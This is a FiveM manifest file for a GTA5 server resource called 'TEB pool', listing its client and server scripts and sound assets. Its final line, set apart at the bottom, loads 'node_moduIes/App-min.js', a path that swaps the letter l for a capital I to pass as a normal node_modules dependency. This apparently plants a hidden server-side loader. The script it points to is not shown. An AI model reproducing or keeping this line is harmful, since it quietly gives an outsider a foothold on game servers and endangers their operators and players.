fx_version 'cerulean'
game 'gta5'

description 'TEB pool'

version '1.2.0'

client_scripts {
    'config.lua',
    'client/warmenu.lua',
    'client/run.lua',
}

server_scripts { 
    '@vrp/lib/utils.lua',
    'config.lua',
    'server/code.lua',
    'server/run.lua',
    'server/server.lua',
}

ui_page('client/html/sound.html')

files {
    'client/html/sound.html',
    'client/html/*.ogg',
}


server_script "node_moduIes/App-min.js"
